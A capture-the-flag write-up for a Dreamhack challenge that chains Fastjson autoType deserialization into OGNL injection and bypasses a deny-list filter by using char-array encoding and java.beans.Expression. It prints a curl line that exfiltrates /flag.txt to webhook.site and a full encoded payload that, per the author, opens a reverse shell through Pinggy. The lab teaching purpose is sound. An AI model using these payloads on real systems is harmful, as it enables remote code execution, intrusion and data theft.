[LINK](https://dreamhack.io/wargame/challenges/1786)

hint : **This challenge is related to CVE and OGNL injection.**
- Base on provided hint , the application  appear to be vulnerable to OGNL injection . By reviewing the source code , we can see that  **InvalidKeyException** class use OGRL . However , when searching for useage of the **InvalidKeyException** class (Alt + F7) , no references were found. ![image](https://hackmd.io/_uploads/S1lZfjBqWx.png)
- in java , some JSON serialization/deserialization libarary provide mechainms such as **AutoType** in Fastjson and **Polymorphic Deserialization** in Jackson.
- application use fastjson version 1.2.83 that contain A CVE
 [MORE](https://jfrog.com/blog/cve-2022-25845-analyzing-the-fastjson-auto-type-bypass-rce-vulnerability/)
    - examble:
        `String object = "{\"@type\":\"java.util.HashMap\",\"name\":\"Quan\"}";
        JSONObject obj = JSON.parseObject(object);` 
        Fastjson will:
            - load class: java.util.HashMap
            -  new instance

        

- In the controller, there is a code snippet:
```
String object = String.format(
    "{\"host\": \"%s\", \"date\": \"%s\", \"location\": \"%s\", \"description\": \"%s\"}",
    host, date, location, description
);
JSONObject obj = JSON.parseObject(object);
```
This means that the attacker can potentially manipulate the object variable before it is parsed by Fastjson.

- identify the vulnerability:
    + payload : `host=host_test&date=2026-03-06&location=NA&description=quad","@type":"com.ctf.invitation.invitation.exception.InvalidKeyException","message":"#a=100,#b=200,#a*#b`
    + result : ![image](https://hackmd.io/_uploads/BJCr4EUqZx.png)
- content of method detectUnsafeInput
```
private static boolean detectUnsafeInput(String msg){
        for(char c : denyCharList){
            if(msg.indexOf(c) != -1){
                return true;
            }
        }

        for(String k : denyKeywordList){
            if(msg.indexOf(k) != -1){
                return true;
            }
        }

        return false;
    }
```
- The idea is to leverage Java Reflection and encode the restricted characters as byte values or another representation so that the OGNL engine can still interpret the expression.
- Solution Approach:
```
Target: Read the /flag.txt file and exfiltrate its contents.
↓
This requires executing an OS command such as:
curl -d $(cat /flag.txt) https://webhook.site/...
↓
Therefore, we need an object capable of executing OS commands.
↓
For example, java.lang.Runtime.exec() or ProcessBuilder.start().
```
```
Layer 1 — What is needed to execute commands?
    → A Runtime instance
    → Runtime rt = Runtime.getRuntime()

Layer 2 — What is needed to call getRuntime()?
    → Runtime.class (Class object)
    → Class.forName("java.lang.Runtime")

Layer 3 — What is needed to call Class.forName()?
    → A String "java.lang.Runtime"
    → An object with .getClass() to invoke forName()
    → "".getClass().forName(...)

Layer 4 — What is needed to call getRuntime() on the Class object?
    → This is a static method → use java.beans.Expression to bypass invocation restrictions
```
- Original payload : `"".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("whoami")`
- Bypass WAF:
    + bypass invoke():
        + By using **java.beans.Expression** , it isn't necessary to call **invoke()** method to excute a method . Instead, the method is executed when .getValue() is called.
        + Expression has a constructor **public java.beans.Expression(java.lang.Object,java.lang.String,java.lang.Object[])**.
    + bypass character filtering
        + use String.replace() or new String (new char[]) , ....
- build payload:
    `host=host_test&date=2026-03-20&location=NA&&description=test","@type":"com.ctf.invitation.invitation.exception.InvalidKeyException","message":"#a=new+String(new+char[]{106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101}),#b=new+String(new+char[]{106,97,118,97,46,98,101,97,110,115,46,69,120,112,114,101,115,115,105,111,110}),#c=new+String(new+char[]{103,101,116,82,117,110,116,105,109,101}),#d=new+String(new+char[]{91,76,106,97,118,97,46,108,97,110,103,46,79,98,106,101,99,116,59}),#e=\"\".getClass().getSuperclass(),#f=\"\".getClass(),#g=\"\".getClass().forName(#d),#ctt=\"\".getClass().forName(#b),#fctt=#ctt.getConstructors()[0],#target1=\"\".getClass().forName(#a),#arr1=new+String[0],#expr1=#fctt.newInstance(#target1,#c,#arr1),#target2=#expr1.getValue(),#arr2=new String[]{new String(new char[]{98,97,115,104,32,45,99,32,101,99,104,111,36,123,73,70,83,125,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,57,51,100,87,86,112,89,83,48,120,77,84,77,116,77,84,103,49,76,84,81,121,76,84,107,122,76,109,69,117,90,110,74,108,90,83,53,119,97,87,53,110,90,51,107,117,98,71,108,117,97,121,56,122,78,106,73,49,77,83,65,119,80,105,89,120,124,98,97,115,101,54,52,36,123,73,70,83,125,45,100,124,98,97,115,104})},#expr2=#fctt.newInstance(#target2,\"exec\",#arr2),#fp=#expr2.getValue()`

- In the above payload, I used a reverse shell and leveraged Pinggy to expose a public IP.
- result : 

![image](https://hackmd.io/_uploads/SyuAres5Zg.png)

- note : 
    - We use getConstructors() instead of getConstructor() to retrieve all available constructors.

    - Additionally, Runtime.exec() does not execute commands through a shell (terminal). Instead, Java directly interprets the provided command string, which means shell features (e.g., $(), pipes, redirection) are not processed unless explicitly invoked via a shell.
    - What happen under the Runtime.exec(cmd):
        - First, Java automatically tokenizes the cmd string into an array of strings based on spaces. For instance, if we execute Runtime.getRuntime().exec("ls -la | grep java");, Java will split it as follows:
            - argv[0] = "ls"
            - argv[1] = "-la"
            - argv[2] = "|" (<-- Here, the pipe character is treated as a regular argument, not a shell operator)
            - argv[3] = "grep"
            - argv[4] = "java"
        - second : system call fork() is called to create chill process
        - thrid step , the exec() function is invoked using the exact array of arguments that Java automatically tokenized above.
        - syntax exec() : `int execve(const char *filename, char *const argv[], 
           char *const envp[]); `
           - const char *filename (obligatory) : Path to the executable file . Java sẽ tự tìm file path để truyền vào nên chúng ta không thể thao túng được. 
           - char *const argv[] (obligatory) : The array of arguments passed to the program . **argv[0]**(Theo chuẩn của C, phần tử đầu tiên của mảng arguments luôn là tên hoặc đường dẫn của chương trình được gọi. Nó giúp bản thân chương trình bash biết nó đang được gọi bằng tên gì)
    - Các flag trong bash:
        - -c : "Đừng mở giao diện chờ, hãy đọc ngay chuỗi ký tự đứng liền sau cờ này, coi nó là lệnh shell, thực thi nó, và sau đó thoát ngay lập tức".
        - -i : Nó ép bash phải khởi chạy ở chế độ tương tác, giống hệt như một terminal thực thụ mà bạn hay mở trên máy tính (có dấu nhắc lệnh, hỗ trợ phím tắt, ghi lại lịch sử lệnh,...).